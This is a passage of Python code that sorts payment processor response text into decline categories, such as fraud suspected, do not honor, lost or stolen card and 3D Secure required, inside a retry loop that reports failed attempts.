                return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
            
            if 'fraud' in search_text or 'fraud suspect' in search_text:
                return 'FRAUD'
            
            if 'gateway rejected: fraud' in search_text:
                return 'GATEWAY REJECTED - FRAUD'
            
            if 'risk_threshold' in search_text:
                return 'RISK THRESHOLD'
            
            if 'processor declined' in search_text:
                return 'PROCESSOR DECLINED'
            
            if 'do not honor' in search_text or 'do_not_honor' in search_text:
                return 'DO NOT HONOR'
            
            if 'closed card' in search_text or 'card closed' in search_text:
                return 'CLOSED CARD'
            
            if 'call issuer' in search_text or 'pick up card' in search_text or 'pickup card' in search_text:
                return 'CALL ISSUER - PICKUP CARD'
            
            if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text:
                return '3D SECURE REQUIRED'
            
            if 'limit exceeded' in search_text or 'exceeds limit' in search_text:
                return 'LIMIT EXCEEDED'
            
            if 'lost or stolen' in search_text or 'stolen card' in search_text:
                return 'LOST/STOLEN CARD'
            
            if 'address verification' in search_text or 'avs' in search_text or 'postal code mismatch' in search_text:
                return 'ADDRESS MISMATCH'
            
            if 'invalid card' in search_text or 'card number invalid' in search_text:
                return 'INVALID CARD'
            
            if 'cannot authorize' in search_text or 'not authorized at this time' in search_text:
                return 'CANNOT AUTHORIZE (POLICY)'
            
            if 'transaction not allowed' in search_text:
                return 'TRANSACTION NOT ALLOWED'
            
            if 'card not activated' in search_text:
                return 'CARD NOT ACTIVATED'
            
            if 'no account' in search_text or 'no_account' in search_text:
                return 'NO ACCOUNT'
            
            if 'card restricted' in search_text:
                return 'CARD RESTRICTED'
            
            if 'issuer or cardholder has put a restriction on the card' in search_text or 'issuer restriction' in search_text:
                return 'ISSUER RESTRICTION - CARD HOLDER RESTRICTION'
            
            if 'declined' in search_text:
                return 'DECLINED'
            
            if reason and len(reason) < 60:
                return reason.upper()
            
            if clean_messages and len(clean_messages) < 100:
                return clean_messages.title()
            
            return 'DECLINED'
            
        except Exception as e:
            last_error = str(e)[:50]
            print(f"[!] Attempt {attempt+1} failed: {last_error}")
            if attempt == max_retries - 1:
                return f'ERROR: {last_error}'
            continue
    
    return f'ERROR: {last_error}'
